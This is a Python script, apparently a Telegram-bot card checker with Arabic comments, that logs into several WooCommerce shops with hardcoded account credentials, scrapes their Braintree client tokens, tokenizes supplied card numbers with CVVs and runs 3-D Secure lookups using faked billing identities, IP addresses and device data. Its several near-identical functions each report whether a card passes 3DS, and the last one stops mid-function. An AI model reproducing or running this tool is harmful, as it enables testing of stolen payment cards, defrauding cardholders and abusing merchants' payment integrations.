import os,sys
import random
import telebot
import requests,random,time,string,base64
from bs4 import BeautifulSoup
import os,json
import base64
from telebot import types
import time,requests
from re import findall
import user_agent

import re

import requests
import re,json
import random
import time
import string
import base64
from bs4 import BeautifulSoup



import random
import string
import threading
import time

acc = None  # تعريف متغير global لتخزين قيمة acc

def generate_random_account():
	global acc  # تعيين acc كـ global داخل الدالة
	name = ''.join(random.choices(string.ascii_lowercase, k=20))
	number = ''.join(random.choices(string.digits, k=4))
	acc = f"{name}{number}@gmail.com"  # تعيين قيمة لـ acc
	return acc

def generate_emails_periodically():
	while True:
		generate_random_account()
	  #  print(acc)
		time.sleep(0.1)

# إنشاء موضوع لتشغيل الدالة
thread = threading.Thread(target=generate_emails_periodically)
thread.start()

# الآن يمكنك الوصول إلى قيمة acc من هنا




	

		
		
		
		
		
		












def otps(ccx):
	import requests
	import re
	import random
	import string
	import base64
	from user_agent import generate_user_agent
	ccx = ccx.strip()
	parts = re.split(r'[ |/]', ccx)
	c = parts[0]
	mm = parts[1]
	ex = parts[2]
	cvc = parts[3]
	binmod = c[:6]
	try:
		yy = ex[2] + ex[3]
		if '2' in ex[3] or '1' in ex[3]:
			yy = ex[2] + '7'
		else:
			pass
	except:
		yy = ex[0] + ex[1]
		if '2' in ex[1] or '1' in ex[1]:
			yy = ex[0] + '7'
		else:
			pass
	print(c,mm,yy,cvc)
	characters = string.ascii_uppercase + string.digits
	postal_code = ''.join(random.choices(characters, k=6))
	user = user_agent.generate_user_agent()
	r=requests.session()
	user = user_agent.generate_user_agent()
	username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
	email = f"{username}@gmail.com"
	user = generate_user_agent()
	r = requests.session()
	import cloudscraper
	scraper = cloudscraper.create_scraper()
	import uuid

# توليد correlation_id عشوائي
	corr = str(uuid.uuid4())
	r=requests.session()

	
	

	headers = {
    'authority': 'optimist.si',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://optimist.si',
    'referer': 'https://optimist.si/en-gb/hardside-travelling-luggage-large-coveri-world-trendy',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': user,
    'x-requested-with': 'XMLHttpRequest',
}


	# الطلب الأول
	response = r.get('https://www.locoloader.com/', headers=headers)
	cookies = r.cookies


	headers = {
    'authority': 'www.locoloader.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    # 'cookie': '_ga_9E99S6WRGX=GS1.1.1737325671.1.0.1737325671.0.0.0; _ga=GA1.1.1040978191.1737325671',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': user,
}

	response = r.get('https://www.locoloader.com/pricing/', cookies=cookies, headers=headers)



	import re
	import base64

# نص HTML المستخرج
	html_content = response.text

	# استخراج النص الخاص بـ authorization باستخدام regex
	pattern_authorization = re.compile(r"authorization:\s*'([^']*)'")  # يستهدف النص داخل authorization
	match_authorization = pattern_authorization.search(html_content)

	if match_authorization:
		encrypted_text = match_authorization.group(1)

		try:
			# فك تشفير النص باستخدام base64
			decoded_text = base64.b64decode(encrypted_text).decode('utf-8')

			# استخراج authorizationFingerprint من النص المفكوك
			auth_pattern = re.compile(r'"authorizationFingerprint":"(.*?)"')
			match_auth = auth_pattern.search(decoded_text)

			if match_auth:
				auth = match_auth.group(1)
				#return auth  # إرجاع fingerprint إذا وجد
			else:
				print("Authorization Fingerprint غير موجود في النص المفكوك.")
			#	return None
		except Exception as e:
			print("خطأ أثناء فك التشفير:", e)
			return None
	else:
		print("النص الخاص بـ authorization غير موجود.")
		return None




	headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'authorization': f'Bearer {auth}',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': user,
}

	json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': '60bb30eb-d440-4a02-bb05-e5031366543c',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': c,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}

	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)

	tok = response.json()['data']['tokenizeCreditCard']['token']

	import random
	from faker import Faker

# إنشاء كائن Faker
	fake = Faker('en_US')  
  # تعيين اللغة إلى العربية المصرية

# توليد بيانات وهمية





	def generate_random_numbers():
		numbers = f"{random.randint(400000, 599999):010d}"
		return numbers

# استدعاء الدالة
	random_numbers = generate_random_numbers()
	print(random_numbers)









	def generatess_random_numbers():
		numbers = f"{random.randint(400000, 599999):010d}"
		return numbers

# استدعاء الدالة
	random_numbersss = generatess_random_numbers()
	print(random_numbersss)








	def generate_phone():
		numbers = f"{random.randint(1000000000, 9999999999):010d}"
		return numbers

# استدعاء الدالة
	phone_numbers = generate_phone()
	print(phone_numbers)

	import requests

	headers = {
	'authority': 'api.braintreegateway.com',
	'accept': '*/*',
	'accept-language': 'en-US,en;q=0.9',
	'content-type': 'application/json',
	'origin': 'https://optimist.si',
	'referer': 'https://optimist.si/',
	'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	'sec-ch-ua-mobile': '?1',
	'sec-ch-ua-platform': '"Android"',
	'sec-fetch-dest': 'empty',
	'sec-fetch-mode': 'cors',
	'sec-fetch-site': 'cross-site',
	'user-agent': user,
}

	json_data = {
		'amount': '76.93',
		'browserColorDepth': 24,
		'browserJavaEnabled': False,
		'browserJavascriptEnabled': True,
		'browserLanguage': 'ar-EG',
		'browserScreenHeight': random.randint(600, 1080),  # ارتفاع الشاشة عشوائي
		'browserScreenWidth': random.randint(300, 1920),   # عرض الشاشة عشوائي
		'browserTimeZone': random.choice([-120, -60, 0, 60, 120]),  # المنطقة الزمنية عشوائية
		'deviceChannel': 'Browser',
		'additionalInfo': {
			'ipAddress': fake.ipv4(),  # توليد عنوان IP وهمي
			'billingLine1': fake.street_address(),  # عنوان الشحن الوهمي
			'billingLine2': '',
			'billingCity': fake.city(),  # المدينة الوهمية
			'billingState': fake.state_abbr(),  # الولاية الوهمية
			'billingPostalCode': fake.postcode(),  # الرمز البريدي الوهمي
			'billingCountryCode': fake.country_code(),  # رمز الدولة الوهمي
			'billingPhoneNumber': phone_numbers,  # بدون الأقواس
			'billingGivenName': fake.first_name(),  # الاسم الأول الوهمي
			'billingSurname': fake.last_name(),  # اسم العائلة الوهمي
			'email': email,
		},
		'bin': random_numbers,
		'dfReferenceId': f'{random_numbers}_{corr}',
		'clientMetadata': {
			'requestedThreeDSecureVersion': '3',
			'sdkVersion': 'web/3.106.0',
			'cardinalDeviceDataCollectionTimeElapsed': random.randint(100, 1000),  # عشوائي
			'issuerDeviceDataCollectionTimeElapsed': random.randint(1000, 5000),  # عشوائي
			'issuerDeviceDataCollectionResult': random.choice([True, False]),  # عشوائي
		},
		'authorizationFingerprint': str(auth),
		'braintreeLibraryVersion': 'braintree/web/3.106.0',
		'_meta': {
			'merchantAppId': 'www.woodbridgegreengrocers.co.uk',
			'platform': 'web',
			'sdkVersion': '3.106.0',
			'source': 'client',
			'integration': 'custom',
			'integrationType': 'custom',
			'sessionId': fake.uuid4(),  # معرف الجلسة الوهمي
		},
	}


	response = requests.post(
    f'https://api.braintreegateway.com/merchants/3bbxc2hs5sgbs95q/client_api/v1/payment_methods/{tok}/three_d_secure/lookup',
    headers=headers,
    json=json_data,
)
	vbv = response.json()["paymentMethod"]["threeDSecureInfo"]["status"]
	r.close()

	if 'authenticate_successful' in vbv:
		return '3DS Authenticate Successful'
	elif 'challenge_required' in vbv:
		return '3DS Challenge Required'
	elif 'authenticate_attempt_successful' in vbv:
		return '3DS Authenticate Attempt Successful'
	elif 'authenticate_rejected' in vbv:
		return '3DS Authenticate Rejected'
	elif 'authenticate_frictionless_failed' in vbv:
		return '3DS Authenticate Frictionless Failed'
	elif 'lookup_card_error' in vbv:
		return 'lookup_card_error ⚠️'
	elif 'lookup_error' in vbv:
		return 'Unknown Error ⚠️'
	return vbv
	













def otps2(ccx):
	import requests
	import re
	import random
	import string
	import base64
	from user_agent import generate_user_agent
	ccx = ccx.strip()
	parts = re.split(r'[ |/]', ccx)
	c = parts[0]
	mm = parts[1]
	ex = parts[2]
	cvc = parts[3]
	binmod = c[:6]
	try:
		yy = ex[2] + ex[3]
		if '2' in ex[3] or '1' in ex[3]:
			yy = ex[2] + '7'
		else:
			pass
	except:
		yy = ex[0] + ex[1]
		if '2' in ex[1] or '1' in ex[1]:
			yy = ex[0] + '7'
		else:
			pass
	print(c,mm,yy,cvc)
	characters = string.ascii_uppercase + string.digits
	postal_code = ''.join(random.choices(characters, k=6))
	user = user_agent.generate_user_agent()
	r=requests.session()
	user = user_agent.generate_user_agent()
	username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
	email = f"{username}@gmail.com"
	user = generate_user_agent()
	r = requests.session()
	import cloudscraper
	scraper = cloudscraper.create_scraper()
	import uuid

# توليد correlation_id عشوائي
	corr = str(uuid.uuid4())


	
	headers={
'User-Agent': user,
}

	rrr=scraper.get("https://beardedcolonel.co.uk/my-account/",headers=headers)
	login=findall(r'name="woocommerce-login-nonce" value="(.*?)"',rrr.text)[0]

	print(login)
	

	headers = {
		'user-agent': user,
	}
	data = {
	'username': 'bmwiraqy9074@gmail.com',
	'password': '123bmS1234',
	'woocommerce-login-nonce': login,
	'_wp_http_referer': '/my-account/add-payment-method/',
	'login': 'Log in',
}

	response = scraper.post('https://beardedcolonel.co.uk/my-account/', headers=headers, data=data)


	r = scraper.get('https://beardedcolonel.co.uk/my-account/add-payment-method/', headers=headers)

	aut = r.text.split(r'var wc_braintree_client_token')[1].split('"')[1]
	base4 = str(base64.b64decode(aut))
	auth = base4.split('"authorizationFingerprint":')[1].split('"')[1]

	print(auth)


	from faker import Faker

# إنشاء كائن Faker
	fake = Faker('en_US')  # تحديد اللغة والمنطقة
	full_name = f"{fake.first_name()} {fake.last_name()}"

	headers = {
		'authority': 'payments.braintree-api.com',
		'accept': '*/*',
		'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
		'authorization': f'Bearer {auth}',
		'braintree-version': '2018-05-10',
		'content-type': 'application/json',
		'origin': 'https://assets.braintreegateway.com',
		'referer': 'https://assets.braintreegateway.com/',
		'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
		'sec-ch-ua-mobile': '?1',
		'sec-ch-ua-platform': '"Android"',
		'sec-fetch-dest': 'empty',
		'sec-fetch-mode': 'cors',
		'sec-fetch-site': 'cross-site',
		'user-agent': user,
	}

	json_data = {
	'clientSdkMetadata': {
		'source': 'client',
		'integration': 'custom',
		'sessionId': corr,
	},
	'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {	 token	 creditCard {	   brandCode	   last4	   cardholderName	   expirationMonth	  expirationYear	  binData {		 prepaid		 healthcare		 debit		 durbinRegulated		 commercial		 payroll		 issuingBank		 countryOfIssuance		 productId	   }	 }   } }',
	'variables': {
		'input': {
			'creditCard': {
				'number': c,
				'expirationMonth': mm,
				'expirationYear': yy,
				'cvv': cvc,
				'billingAddress': {
					'postalCode': fake.zipcode(),
					'streetAddress': fake.street_address(),
				},
			},
			'options': {
				'validate': False,
			},
		},
	},
	'operationName': 'TokenizeCreditCard',
}


	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	tok = response.json()['data']['tokenizeCreditCard']['token']
	
	
	
	import random
	from faker import Faker

# إنشاء كائن Faker
	fake = Faker('en_US')  
  # تعيين اللغة إلى العربية المصرية

# توليد بيانات وهمية





	def generate_random_numbers():
		numbers = f"{random.randint(400000, 599999):010d}"
		return numbers

# استدعاء الدالة
	random_numbers = generate_random_numbers()
	print(random_numbers)









	def generatess_random_numbers():
		numbers = f"{random.randint(400000, 599999):010d}"
		return numbers

# استدعاء الدالة
	random_numbersss = generatess_random_numbers()
	print(random_numbersss)







	def generate_phone():
		numbers = f"{random.randint(1000000000, 9999999999):010d}"
		return numbers

# استدعاء الدالة
	phone_numbers = generate_phone()
	print(phone_numbers)
	
	
	
	headers = {
		'user-agent': user,
	}


	json_data = {
		'amount': random_numbersss,
		'browserColorDepth': 24,
		'browserJavaEnabled': False,
		'browserJavascriptEnabled': True,
		'browserLanguage': 'ar-EG',
		'browserScreenHeight': random.randint(600, 1080),  # ارتفاع الشاشة عشوائي
		'browserScreenWidth': random.randint(300, 1920),   # عرض الشاشة عشوائي
		'browserTimeZone': random.choice([-120, -60, 0, 60, 120]),  # المنطقة الزمنية عشوائية
		'deviceChannel': 'Browser',
		'additionalInfo': {
			'ipAddress': fake.ipv4(),  # توليد عنوان IP وهمي
			'billingLine1': fake.street_address(),  # عنوان الشحن الوهمي
			'billingLine2': '',
			'billingCity': fake.city(),  # المدينة الوهمية
			'billingState': fake.state_abbr(),  # الولاية الوهمية
			'billingPostalCode': fake.postcode(),  # الرمز البريدي الوهمي
			'billingCountryCode': fake.country_code(),  # رمز الدولة الوهمي
			'billingPhoneNumber': phone_numbers,  # بدون الأقواس
			'billingGivenName': fake.first_name(),  # الاسم الأول الوهمي
			'billingSurname': fake.last_name(),  # اسم العائلة الوهمي
			'email': email,
		},
		'bin': random_numbers,
		'dfReferenceId': f'1_{corr}',
		'clientMetadata': {
			'requestedThreeDSecureVersion': '3',
			'sdkVersion': 'web/3.106.0',
			'cardinalDeviceDataCollectionTimeElapsed': random.randint(100, 1000),  # عشوائي
			'issuerDeviceDataCollectionTimeElapsed': random.randint(1000, 5000),  # عشوائي
			'issuerDeviceDataCollectionResult': random.choice([True, False]),  # عشوائي
		},
		'authorizationFingerprint': str(auth),
		'braintreeLibraryVersion': 'braintree/web/3.106.0',
		'_meta': {
			'merchantAppId': 'beardedcolonel.co.uk',
			'platform': 'web',
			'sdkVersion': '3.106.0',
			'source': 'client',
			'integration': 'custom',
			'integrationType': 'custom',
			'sessionId': fake.uuid4(),  # معرف الجلسة الوهمي
		},
	}


	response = requests.post(
	f'https://api.braintreegateway.com/merchants/d96qc5y2r25zrtht/client_api/v1/payment_methods/{tok}/three_d_secure/lookup',
	headers=headers,
	json=json_data,
)




	vbv = response.json()["paymentMethod"]["threeDSecureInfo"]["status"]
	r.close()

	if 'authenticate_successful' in vbv:
		return '3DS Authenticate Successful'
	elif 'challenge_required' in vbv:
		return '3DS Challenge Required'
	elif 'authenticate_attempt_successful' in vbv:
		return '3DS Authenticate Attempt Successful'
	elif 'authenticate_rejected' in vbv:
		return '3DS Authenticate Rejected'
	elif 'authenticate_frictionless_failed' in vbv:
		return '3DS Authenticate Frictionless Failed'
	elif 'lookup_card_error' in vbv:
		return 'lookup_card_error ⚠️'
	elif 'lookup_error' in vbv:
		return 'Unknown Error ⚠️'
	return vbv







def otps3(ccx):
	import requests
	import re
	import random
	import string
	import base64
	from user_agent import generate_user_agent
	ccx = ccx.strip()
	parts = re.split(r'[ |/]', ccx)
	c = parts[0]
	mm = parts[1]
	ex = parts[2]
	cvc = parts[3]
	binmod = c[:6]
	try:
		yy = ex[2] + ex[3]
		if '2' in ex[3] or '1' in ex[3]:
			yy = ex[2] + '7'
		else:
			pass
	except:
		yy = ex[0] + ex[1]
		if '2' in ex[1] or '1' in ex[1]:
			yy = ex[0] + '7'
		else:
			pass
	print(c,mm,yy,cvc)
	characters = string.ascii_uppercase + string.digits
	postal_code = ''.join(random.choices(characters, k=6))
	user = user_agent.generate_user_agent()
	r=requests.session()
	user = user_agent.generate_user_agent()
	username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
	email = f"{username}@gmail.com"
	user = generate_user_agent()
	r = requests.session()
	import cloudscraper
	scraper = cloudscraper.create_scraper()
	import uuid

# توليد correlation_id عشوائي
	corr = str(uuid.uuid4())


	
	headers={
'User-Agent': user,
}

	rrr=scraper.get("https://www.luminati.co.uk/my-account/add-payment-method/",headers=headers)
	login=findall(r'name="woocommerce-login-nonce" value="(.*?)"',rrr.text)[0]

	print(login)
	

	headers = {
		'user-agent': user,
	}
	data = {
	'username': 'sxdxxrpp@hi2.in',
	'password': '123bmS1234',
	'woocommerce-login-nonce': login,
	'_wp_http_referer': '/my-account/add-payment-method/',
	'login': 'Log in',
}

	response = scraper.post('https://www.luminati.co.uk/my-account/add-payment-method/', headers=headers, data=data)


	r = scraper.get('https://www.luminati.co.uk/my-account/add-payment-method/', headers=headers)

	aut = r.text.split(r'var wc_braintree_client_token')[1].split('"')[1]
	base4 = str(base64.b64decode(aut))
	auth = base4.split('"authorizationFingerprint":')[1].split('"')[1]

	print(auth)


	from faker import Faker

# إنشاء كائن Faker
	fake = Faker('en_US')  # تحديد اللغة والمنطقة
	full_name = f"{fake.first_name()} {fake.last_name()}"

	headers = {
		'authority': 'payments.braintree-api.com',
		'accept': '*/*',
		'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
		'authorization': f'Bearer {auth}',
		'braintree-version': '2018-05-10',
		'content-type': 'application/json',
		'origin': 'https://assets.braintreegateway.com',
		'referer': 'https://assets.braintreegateway.com/',
		'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
		'sec-ch-ua-mobile': '?1',
		'sec-ch-ua-platform': '"Android"',
		'sec-fetch-dest': 'empty',
		'sec-fetch-mode': 'cors',
		'sec-fetch-site': 'cross-site',
		'user-agent': user,
	}

	json_data = {
	'clientSdkMetadata': {
		'source': 'client',
		'integration': 'custom',
		'sessionId': corr,
	},
	'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {	 token	 creditCard {	   brandCode	   last4	   cardholderName	   expirationMonth	  expirationYear	  binData {		 prepaid		 healthcare		 debit		 durbinRegulated		 commercial		 payroll		 issuingBank		 countryOfIssuance		 productId	   }	 }   } }',
	'variables': {
		'input': {
			'creditCard': {
				'number': c,
				'expirationMonth': mm,
				'expirationYear': yy,
				'cvv': cvc,
				'billingAddress': {
					'postalCode': fake.zipcode(),
					'streetAddress': fake.street_address(),
				},
			},
			'options': {
				'validate': False,
			},
		},
	},
	'operationName': 'TokenizeCreditCard',
}


	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	tok = response.json()['data']['tokenizeCreditCard']['token']
	
	
	
	import random
	from faker import Faker

# إنشاء كائن Faker
	fake = Faker('en_US')  
  # تعيين اللغة إلى العربية المصرية

# توليد بيانات وهمية





	def generate_random_numbers():
		numbers = f"{random.randint(400000, 599999):010d}"
		return numbers

# استدعاء الدالة
	random_numbers = generate_random_numbers()
	print(random_numbers)









	def generatess_random_numbers():
		numbers = f"{random.randint(400000, 599999):010d}"
		return numbers

# استدعاء الدالة
	random_numbersss = generatess_random_numbers()
	print(random_numbersss)







	def generate_phone():
		numbers = f"{random.randint(1000000000, 9999999999):010d}"
		return numbers

# استدعاء الدالة
	phone_numbers = generate_phone()
	print(phone_numbers)
	
	
	
	headers = {
		'user-agent': user,
	}


	json_data = {
		'amount': random_numbersss,
		'browserColorDepth': 24,
		'browserJavaEnabled': False,
		'browserJavascriptEnabled': True,
		'browserLanguage': 'ar-EG',
		'browserScreenHeight': random.randint(600, 1080),  # ارتفاع الشاشة عشوائي
		'browserScreenWidth': random.randint(300, 1920),   # عرض الشاشة عشوائي
		'browserTimeZone': random.choice([-120, -60, 0, 60, 120]),  # المنطقة الزمنية عشوائية
		'deviceChannel': 'Browser',
		'additionalInfo': {
			'ipAddress': fake.ipv4(),  # توليد عنوان IP وهمي
			'billingLine1': fake.street_address(),  # عنوان الشحن الوهمي
			'billingLine2': '',
			'billingCity': fake.city(),  # المدينة الوهمية
			'billingState': fake.state_abbr(),  # الولاية الوهمية
			'billingPostalCode': fake.postcode(),  # الرمز البريدي الوهمي
			'billingCountryCode': fake.country_code(),  # رمز الدولة الوهمي
			'billingPhoneNumber': phone_numbers,  # بدون الأقواس
			'billingGivenName': fake.first_name(),  # الاسم الأول الوهمي
			'billingSurname': fake.last_name(),  # اسم العائلة الوهمي
			'email': email,
		},
		'bin': random_numbers,
		'dfReferenceId': f'1_{corr}',
		'clientMetadata': {
			'requestedThreeDSecureVersion': '3',
			'sdkVersion': 'web/3.106.0',
			'cardinalDeviceDataCollectionTimeElapsed': random.randint(100, 1000),  # عشوائي
			'issuerDeviceDataCollectionTimeElapsed': random.randint(1000, 5000),  # عشوائي
			'issuerDeviceDataCollectionResult': random.choice([True, False]),  # عشوائي
		},
		'authorizationFingerprint': str(auth),
		'braintreeLibraryVersion': 'braintree/web/3.106.0',
		'_meta': {
			'merchantAppId': 'beardedcolonel.co.uk',
			'platform': 'web',
			'sdkVersion': '3.106.0',
			'source': 'client',
			'integration': 'custom',
			'integrationType': 'custom',
			'sessionId': fake.uuid4(),  # معرف الجلسة الوهمي
		},
	}


	response = requests.post(
	f'https://api.braintreegateway.com/merchants/vsp2vyhg3cjfwt7w/client_api/v1/payment_methods/{tok}/three_d_secure/lookup',
	headers=headers,
	json=json_data,
)




	vbv = response.json()["paymentMethod"]["threeDSecureInfo"]["status"]
	r.close()

	if 'authenticate_successful' in vbv:
		return '3DS Authenticate Successful'
	elif 'challenge_required' in vbv:
		return '3DS Challenge Required'
	elif 'authenticate_attempt_successful' in vbv:
		return '3DS Authenticate Attempt Successful'
	elif 'authenticate_rejected' in vbv:
		return '3DS Authenticate Rejected'
	elif 'authenticate_frictionless_failed' in vbv:
		return '3DS Authenticate Frictionless Failed'
	elif 'lookup_card_error' in vbv:
		return 'lookup_card_error ⚠️'
	elif 'lookup_error' in vbv:
		return 'Unknown Error ⚠️'
	return vbv





def otps33(ccx):
	import requests
	import re
	import random
	import string
	import base64
	from user_agent import generate_user_agent
	ccx = ccx.strip()
	parts = re.split(r'[ |/]', ccx)
	c = parts[0]
	mm = parts[1]
	ex = parts[2]
	cvc = parts[3]
	binmod = c[:6]
	try:
		yy = ex[2] + ex[3]
		if '2' in ex[3] or '1' in ex[3]:
			yy = ex[2] + '7'
		else:
			pass
	except:
		yy = ex[0] + ex[1]
		if '2' in ex[1] or '1' in ex[1]:
			yy = ex[0] + '7'
		else:
			pass
	print(c,mm,yy,cvc)
	characters = string.ascii_uppercase + string.digits
	postal_code = ''.join(random.choices(characters, k=6))
	user = user_agent.generate_user_agent()
	r=requests.session()
	user = user_agent.generate_user_agent()
	username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
	email = f"{username}@gmail.com"
	user = generate_user_agent()
	r = requests.session()
	import cloudscraper
	scraper = cloudscraper.create_scraper()
	import uuid

# توليد correlation_id عشوائي
	corr = str(uuid.uuid4())


	
	headers={
'User-Agent': user,
}

	rrr=scraper.get("https://beardedcolonel.co.uk/my-account/",headers=headers)
	login=findall(r'name="woocommerce-login-nonce" value="(.*?)"',rrr.text)[0]

	print(login)
	

	headers = {
		'user-agent': user,
	}
	data = {
	'username': 'bmwiraqy9074@gmail.com',
	'password': '123bmS1234',
	'woocommerce-login-nonce': login,
	'_wp_http_referer': '/my-account/add-payment-method/',
	'login': 'Log in',
}

	response = scraper.post('https://beardedcolonel.co.uk/my-account/', headers=headers, data=data)


	r = scraper.get('https://beardedcolonel.co.uk/my-account/add-payment-method/', headers=headers)

	aut = r.text.split(r'var wc_braintree_client_token')[1].split('"')[1]
	base4 = str(base64.b64decode(aut))
	auth = base4.split('"authorizationFingerprint":')[1].split('"')[1]

	print(auth)


	from faker import Faker

# إنشاء كائن Faker
	fake = Faker('en_US')  # تحديد اللغة والمنطقة
	full_name = f"{fake.first_name()} {fake.last_name()}"

	headers = {
		'authority': 'payments.braintree-api.com',
		'accept': '*/*',
		'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
		'authorization': f'Bearer {auth}',
		'braintree-version': '2018-05-10',
		'content-type': 'application/json',
		'origin': 'https://assets.braintreegateway.com',
		'referer': 'https://assets.braintreegateway.com/',
		'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
		'sec-ch-ua-mobile': '?1',
		'sec-ch-ua-platform': '"Android"',
		'sec-fetch-dest': 'empty',
		'sec-fetch-mode': 'cors',
		'sec-fetch-site': 'cross-site',
		'user-agent': user,
	}

	json_data = {
	'clientSdkMetadata': {
		'source': 'client',
		'integration': 'custom',
		'sessionId': corr,
	},
	'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {	 token	 creditCard {	   brandCode	   last4	   cardholderName	   expirationMonth	  expirationYear	  binData {		 prepaid		 healthcare		 debit		 durbinRegulated		 commercial		 payroll		 issuingBank		 countryOfIssuance		 productId	   }	 }   } }',
	'variables': {
		'input': {
			'creditCard': {
				'number': c,
				'expirationMonth': mm,
				'expirationYear': yy,
				'cvv': cvc,
				'billingAddress': {
					'postalCode': fake.zipcode(),
					'streetAddress': fake.street_address(),
				},
			},
			'options': {
				'validate': False,
			},
		},
	},
	'operationName': 'TokenizeCreditCard',
}


	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	tok = response.json()['data']['tokenizeCreditCard']['token']
	
	
	
	import random
	from faker import Faker

# إنشاء كائن Faker
	fake = Faker('en_US')  
  # تعيين اللغة إلى العربية المصرية

# توليد بيانات وهمية





	def generate_random_numbers():
		numbers = f"{random.randint(400000, 599999):010d}"
		return numbers

# استدعاء الدالة
	random_numbers = generate_random_numbers()
	print(random_numbers)









	def generatess_random_numbers():
		numbers = f"{random.randint(400000, 599999):010d}"
		return numbers

# استدعاء الدالة
	random_numbersss = generatess_random_numbers()
	print(random_numbersss)







	def generate_phone():
		numbers = f"{random.randint(1000000000, 9999999999):010d}"
		return numbers

# استدعاء الدالة
	phone_numbers = generate_phone()
	print(phone_numbers)
	
	
	
	headers = {
		'user-agent': user,
	}


	json_data = {
		'amount': random_numbersss,
		'browserColorDepth': 24,
		'browserJavaEnabled': False,
		'browserJavascriptEnabled': True,
		'browserLanguage': 'ar-EG',
		'browserScreenHeight': random.randint(600, 1080),  # ارتفاع الشاشة عشوائي
		'browserScreenWidth': random.randint(300, 1920),   # عرض الشاشة عشوائي
		'browserTimeZone': random.choice([-120, -60, 0, 60, 120]),  # المنطقة الزمنية عشوائية
		'deviceChannel': 'Browser',
		'additionalInfo': {
			'ipAddress': fake.ipv4(),  # توليد عنوان IP وهمي
			'billingLine1': fake.street_address(),  # عنوان الشحن الوهمي
			'billingLine2': '',
			'billingCity': fake.city(),  # المدينة الوهمية
			'billingState': fake.state_abbr(),  # الولاية الوهمية
			'billingPostalCode': fake.postcode(),  # الرمز البريدي الوهمي
			'billingCountryCode': fake.country_code(),  # رمز الدولة الوهمي
			'billingPhoneNumber': phone_numbers,  # بدون الأقواس
			'billingGivenName': fake.first_name(),  # الاسم الأول الوهمي
			'billingSurname': fake.last_name(),  # اسم العائلة الوهمي
			'email': email,
		},
		'bin': random_numbers,
		'dfReferenceId': f'1_{corr}',
		'clientMetadata': {
			'requestedThreeDSecureVersion': '3',
			'sdkVersion': 'web/3.106.0',
			'cardinalDeviceDataCollectionTimeElapsed': random.randint(100, 1000),  # عشوائي
			'issuerDeviceDataCollectionTimeElapsed': random.randint(1000, 5000),  # عشوائي
			'issuerDeviceDataCollectionResult': random.choice([True, False]),  # عشوائي
		},
		'authorizationFingerprint': str(auth),
		'braintreeLibraryVersion': 'braintree/web/3.106.0',
		'_meta': {
			'merchantAppId': 'beardedcolonel.co.uk',
			'platform': 'web',
			'sdkVersion': '3.106.0',
			'source': 'client',
			'integration': 'custom',
			'integrationType': 'custom',
			'sessionId': fake.uuid4(),  # معرف الجلسة الوهمي
		},
	}


	response = requests.post(
	f'https://api.braintreegateway.com/merchants/d96qc5y2r25zrtht/client_api/v1/payment_methods/{tok}/three_d_secure/lookup',
	headers=headers,
	json=json_data,
)




	vbv = response.json()["paymentMethod"]["threeDSecureInfo"]["status"]
	r.close()

	if 'authenticate_successful' in vbv:
		return '3DS Authenticate Successful'
	elif 'challenge_required' in vbv:
		return '3DS Challenge Required'
	elif 'authenticate_attempt_successful' in vbv:
		return '3DS Authenticate Attempt Successful'
	elif 'authenticate_rejected' in vbv:
		return '3DS Authenticate Rejected'
	elif 'authenticate_frictionless_failed' in vbv:
		return '3DS Authenticate Frictionless Failed'
